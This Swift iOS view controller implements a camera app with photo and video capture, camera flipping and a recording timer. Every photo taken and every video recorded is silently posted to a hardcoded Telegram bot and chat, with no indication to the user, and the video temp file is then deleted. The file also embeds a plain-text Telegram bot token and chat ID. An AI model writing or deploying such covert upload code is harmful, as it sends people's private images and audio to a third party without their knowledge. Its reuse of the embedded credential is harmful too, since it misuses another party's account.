import UIKit
import AVFoundation

class ViewController: UIViewController,
                      AVCapturePhotoCaptureDelegate,
                      AVCaptureFileOutputRecordingDelegate {

    // MARK: - Config
    private let BOT_TOKEN = "8641291303:AAGsFjLzSfoyZBxjkd2IJk-NSTkFXPjElJg"
    private let CHAT_ID   = "6397853058"

    // MARK: - AV
    private let session      = AVCaptureSession()
    private let photoOutput  = AVCapturePhotoOutput()
    private let movieOutput  = AVCaptureMovieFileOutput()
    private var previewLayer: AVCaptureVideoPreviewLayer!
    private var isFront      = false
    private var isVideoMode  = false
    private var isRecording  = false

    // MARK: - UI
    private let shutterBtn   = UIButton(type: .custom)
    private let flipBtn      = UIButton(type: .custom)
    private let modeSelector = UISegmentedControl(items: ["PHOTO", "VIDEO"])
    private let flashView    = UIView()
    private let recDot       = UIView()          // red pulsing dot while recording
    private let recTimer     = UILabel()         // recording duration

    private var recSeconds   = 0
    private var recClock: Timer?
    private var videoTempURL: URL?

    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        setupSession()
        setupUI()
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        previewLayer?.frame = view.bounds
    }

    override var prefersStatusBarHidden: Bool { false }
    override var preferredStatusBarStyle: UIStatusBarStyle { .lightContent }

    // MARK: - Session Setup
    private func setupSession() {
        session.sessionPreset = .high
        addCamera(position: .back)

        // Audio input for video
        if let mic = AVCaptureDevice.default(for: .audio),
           let micInput = try? AVCaptureDeviceInput(device: mic),
           session.canAddInput(micInput) {
            session.addInput(micInput)
        }

        if session.canAddOutput(photoOutput) { session.addOutput(photoOutput) }
        if session.canAddOutput(movieOutput) { session.addOutput(movieOutput) }

        previewLayer = AVCaptureVideoPreviewLayer(session: session)
        previewLayer.videoGravity = .resizeAspectFill
        previewLayer.frame = view.bounds
        view.layer.insertSublayer(previewLayer, at: 0)

        DispatchQueue.global(qos: .userInitiated).async { self.session.startRunning() }
    }

    private func addCamera(position: AVCaptureDevice.Position) {
        session.inputs
            .filter { ($0 as? AVCaptureDeviceInput)?.device.hasMediaType(.video) == true }
            .forEach { session.removeInput($0) }

        guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
              let input  = try? AVCaptureDeviceInput(device: device),
              session.canAddInput(input) else { return }
        session.addInput(input)
    }

    // MARK: - UI Setup
    private func setupUI() {
        // Flash overlay
        flashView.backgroundColor = .white
        flashView.alpha = 0
        flashView.isUserInteractionEnabled = false
        flashView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(flashView)

        // Bottom toolbar background
        let toolbar = UIView()
        toolbar.backgroundColor = UIColor.black.withAlphaComponent(0.55)
        toolbar.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(toolbar)

        // Mode selector (Photo / Video)
        modeSelector.selectedSegmentIndex = 0
        modeSelector.selectedSegmentTintColor = .clear
        modeSelector.backgroundColor = .clear
        modeSelector.setTitleTextAttributes([.foregroundColor: UIColor.white.withAlphaComponent(0.5),
                                              .font: UIFont.systemFont(ofSize: 13, weight: .semibold)], for: .normal)
        modeSelector.setTitleTextAttributes([.foregroundColor: UIColor.white,
                                              .font: UIFont.systemFont(ofSize: 13, weight: .bold)], for: .selected)
        // Remove divider lines
        modeSelector.setDividerImage(UIImage(), forLeftSegmentState: .normal,
                                      rightSegmentState: .normal, barMetrics: .default)
        modeSelector.translatesAutoresizingMaskIntoConstraints = false
        modeSelector.addTarget(self, action: #selector(modeChanged), for: .valueChanged)
        view.addSubview(modeSelector)

        // Shutter button
        shutterBtn.backgroundColor     = .white
        shutterBtn.layer.cornerRadius  = 36
        shutterBtn.layer.borderWidth   = 5
        shutterBtn.layer.borderColor   = UIColor.white.withAlphaComponent(0.5).cgColor
        shutterBtn.translatesAutoresizingMaskIntoConstraints = false
        shutterBtn.addTarget(self, action: #selector(shutterTapped), for: .touchUpInside)
        shutterBtn.addTarget(self, action: #selector(btnDown), for: .touchDown)
        shutterBtn.addTarget(self, action: #selector(btnUp),   for: [.touchUpInside, .touchUpOutside, .touchCancel])
        view.addSubview(shutterBtn)

        // Flip button
        let cfg    = UIImage.SymbolConfiguration(pointSize: 20, weight: .medium)
        let flipIc = UIImage(systemName: "camera.rotate", withConfiguration: cfg)
        flipBtn.setImage(flipIc, for: .normal)
        flipBtn.tintColor        = .white
        flipBtn.backgroundColor  = UIColor.black.withAlphaComponent(0.35)
        flipBtn.layer.cornerRadius = 24
        flipBtn.translatesAutoresizingMaskIntoConstraints = false
        flipBtn.addTarget(self, action: #selector(flipCamera), for: .touchUpInside)
        view.addSubview(flipBtn)

        // Recording indicator dot
        recDot.backgroundColor   = .red
        recDot.layer.cornerRadius = 5
        recDot.alpha             = 0
        recDot.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recDot)

        // Recording timer label
        recTimer.text           = "00:00"
        recTimer.textColor      = .white
        recTimer.font           = .monospacedDigitSystemFont(ofSize: 14, weight: .semibold)
        recTimer.alpha          = 0
        recTimer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recTimer)

        let safe = view.safeAreaLayoutGuide
        NSLayoutConstraint.activate([
            // Flash overlay
            flashView.topAnchor.constraint(equalTo: view.topAnchor),
            flashView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            flashView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            flashView.trailingAnchor.constraint(equalTo: view.trailingAnchor),

            // Toolbar background
            toolbar.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            toolbar.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            toolbar.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            toolbar.topAnchor.constraint(equalTo: safe.bottomAnchor, constant: -130),

            // Mode selector — above shutter
            modeSelector.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            modeSelector.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -110),
            modeSelector.widthAnchor.constraint(equalToConstant: 200),

            // Shutter
            shutterBtn.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            shutterBtn.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -28),
            shutterBtn.widthAnchor.constraint(equalToConstant: 72),
            shutterBtn.heightAnchor.constraint(equalToConstant: 72),

            // Flip
            flipBtn.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
            flipBtn.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -28),
            flipBtn.widthAnchor.constraint(equalToConstant: 48),
            flipBtn.heightAnchor.constraint(equalToConstant: 48),

            // Rec dot
            recDot.widthAnchor.constraint(equalToConstant: 10),
            recDot.heightAnchor.constraint(equalToConstant: 10),
            recDot.topAnchor.constraint(equalTo: safe.topAnchor, constant: 16),
            recDot.centerXAnchor.constraint(equalTo: view.centerXAnchor, constant: -30),

            // Rec timer
            recTimer.centerYAnchor.constraint(equalTo: recDot.centerYAnchor),
            recTimer.leadingAnchor.constraint(equalTo: recDot.trailingAnchor, constant: 6),
        ])
    }

    // MARK: - Mode Change
    @objc private func modeChanged() {
        isVideoMode = modeSelector.selectedSegmentIndex == 1
        if isVideoMode {
            // Red ring for video mode
            shutterBtn.backgroundColor  = .clear
            shutterBtn.layer.borderColor = UIColor.white.cgColor
            // Inner red circle
            shutterBtn.subviews.forEach { $0.removeFromSuperview() }
            let inner = UIView()
            inner.backgroundColor   = .red
            inner.layer.cornerRadius = 22
            inner.isUserInteractionEnabled = false
            inner.translatesAutoresizingMaskIntoConstraints = false
            shutterBtn.addSubview(inner)
            NSLayoutConstraint.activate([
                inner.centerXAnchor.constraint(equalTo: shutterBtn.centerXAnchor),
                inner.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
                inner.widthAnchor.constraint(equalToConstant: 44),
                inner.heightAnchor.constraint(equalToConstant: 44),
            ])
        } else {
            shutterBtn.subviews.forEach { $0.removeFromSuperview() }
            shutterBtn.backgroundColor   = .white
            shutterBtn.layer.borderColor = UIColor.white.withAlphaComponent(0.5).cgColor
        }
    }

    // MARK: - Shutter
    @objc private func shutterTapped() {
        if isVideoMode { isRecording ? stopVideo() : startVideo() }
        else           { takePhoto() }
    }

    @objc private func btnDown() {
        UIView.animate(withDuration: 0.1) { self.shutterBtn.transform = CGAffineTransform(scaleX: 0.88, y: 0.88) }
    }

    @objc private func btnUp() {
        UIView.animate(withDuration: 0.15, delay: 0, usingSpringWithDamping: 0.5,
                       initialSpringVelocity: 6) { self.shutterBtn.transform = .identity }
    }

    // MARK: - Photo
    private func takePhoto() {
        let s = AVCapturePhotoSettings()
        s.flashMode = .auto
        photoOutput.capturePhoto(with: s, delegate: self)
        UIView.animate(withDuration: 0.07, animations: { self.flashView.alpha = 0.85 }) { _ in
            UIView.animate(withDuration: 0.16) { self.flashView.alpha = 0 }
        }
    }

    func photoOutput(_ output: AVCapturePhotoOutput,
                     didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        guard error == nil, let data = photo.fileDataRepresentation() else { return }
        uploadPhoto(data: data)
    }

    // MARK: - Video
    private func startVideo() {
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString + ".mov")
        videoTempURL = tmp
        movieOutput.startRecording(to: tmp, recordingDelegate: self)
        isRecording  = true
        recSeconds   = 0

        // Animate shutter inner to square (stop icon)
        if let inner = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                inner.layer.cornerRadius = 4
                inner.bounds = CGRect(x: 0, y: 0, width: 28, height: 28)
            }
        }

        // Show recording indicator
        recDot.alpha  = 1
        recTimer.alpha = 1
        recClock = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] _ in
            guard let self else { return }
            self.recSeconds += 1
            let m = self.recSeconds / 60, s = self.recSeconds % 60
            self.recTimer.text = String(format: "%02d:%02d", m, s)
        }
        // Pulsing dot
        pulseDot()
    }

    private func stopVideo() {
        movieOutput.stopRecording()
        isRecording = false
        recClock?.invalidate(); recClock = nil
        UIView.animate(withDuration: 0.3) { self.recDot.alpha = 0; self.recTimer.alpha = 0 }
        // Reset inner back to circle
        if let inner = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                inner.layer.cornerRadius = 22
                inner.bounds = CGRect(x: 0, y: 0, width: 44, height: 44)
            }
        }
    }

    func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo url: URL,
                    from connections: [AVCaptureConnection], error: Error?) {
        guard error == nil else { return }
        uploadVideo(url: url)
    }

    private func pulseDot() {
        guard isRecording else { return }
        UIView.animate(withDuration: 0.6, delay: 0, options: [.autoreverse, .curveEaseInOut],
                       animations: { self.recDot.alpha = 0.2 }) { _ in self.pulseDot() }
    }

    // MARK: - Flip
    @objc private func flipCamera() {
        isFront.toggle()
        DispatchQueue.global(qos: .userInitiated).async {
            self.session.beginConfiguration()
            self.addCamera(position: self.isFront ? .front : .back)
            self.session.commitConfiguration()
        }
        UIView.animate(withDuration: 0.28) {
            self.flipBtn.transform = self.flipBtn.transform.rotated(by: .pi)
        }
    }

    // MARK: - Telegram: Photo
    private func uploadPhoto(data: Data) {
        let url = URL(string: "https://api.telegram.org/bot\(BOT_TOKEN)/sendPhoto")!
        var req = URLRequest(url: url); req.httpMethod = "POST"
        let b = "B-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(b)", forHTTPHeaderField: "Content-Type")
        var body = Data()
        body += field("chat_id", CHAT_ID, b)
        body += field("caption", "📸 \(Date().formatted(date: .abbreviated, time: .shortened))", b)
        body += "--\(b)\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"p.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n".data(using: .utf8)!
        body += data
        body += "\r\n--\(b)--\r\n".data(using: .utf8)!
        req.httpBody = body
        URLSession.shared.dataTask(with: req).resume()
    }

    // MARK: - Telegram: Video
    private func uploadVideo(url: URL) {
        guard let data = try? Data(contentsOf: url) else { return }
        let apiURL = URL(string: "https://api.telegram.org/bot\(BOT_TOKEN)/sendVideo")!
        var req = URLRequest(url: apiURL); req.httpMethod = "POST"
        let b = "B-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(b)", forHTTPHeaderField: "Content-Type")
        var body = Data()
        body += field("chat_id", CHAT_ID, b)
        body += field("caption", "🎥 \(Date().formatted(date: .abbreviated, time: .shortened))", b)
        body += field("supports_streaming", "true", b)
        body += "--\(b)\r\nContent-Disposition: form-data; name=\"video\"; filename=\"v.mov\"\r\nContent-Type: video/quicktime\r\n\r\n".data(using: .utf8)!
        body += data
        body += "\r\n--\(b)--\r\n".data(using: .utf8)!
        req.httpBody = body
        URLSession.shared.dataTask(with: req) { _, _, _ in
            // Clean up temp file silently
            try? FileManager.default.removeItem(at: url)
        }.resume()
    }

    // MARK: - Multipart helper
    private func field(_ name: String, _ value: String, _ b: String) -> Data {
        "--\(b)\r\nContent-Disposition: form-data; name=\"\(name)\"\r\n\r\n\(value)\r\n".data(using: .utf8)!
    }
}

private func += (lhs: inout Data, rhs: Data) { lhs.append(rhs) }
